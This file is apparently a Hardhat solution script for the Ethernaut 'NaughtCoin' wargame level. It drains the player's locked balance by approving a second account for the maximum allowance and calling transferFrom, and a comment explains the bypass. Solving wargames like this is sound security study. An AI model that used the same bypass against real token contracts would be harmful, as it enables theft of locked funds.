import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/15.NaughtCoin/NaughtCoin.sol/NaughtCoin.json";
import { BigNumber, Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { sendEther } from "../../utils/sendEther";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0x2052973E39623deb0ECE92228e82d1344C216814";

async function main() {
  const [attacker, recipient] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);
  let tx = await target
    .connect(attacker)
    .approve(recipient.address, ethers.constants.MaxUint256);
  await tx.wait();
  let balance = await target.connect(attacker).balanceOf(attacker.address);

  tx = await attacker.sendTransaction({
    to: recipient.address,
    value: ethers.utils.parseEther("0.001"),
  });
  await tx.wait();
  tx = await target
    .connect(recipient)
    .transferFrom(attacker.address, recipient.address, balance);
  await tx.wait();
  balance = await target.connect(attacker).balanceOf(attacker.address);
  displayResult(BigNumber.from(balance).isZero());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation:
// The contract protected the transfer function, but you can also
// transfer an ERC20 using transferFrom, just set the allowance to INTMAX for
// a contract your control or an eoa;
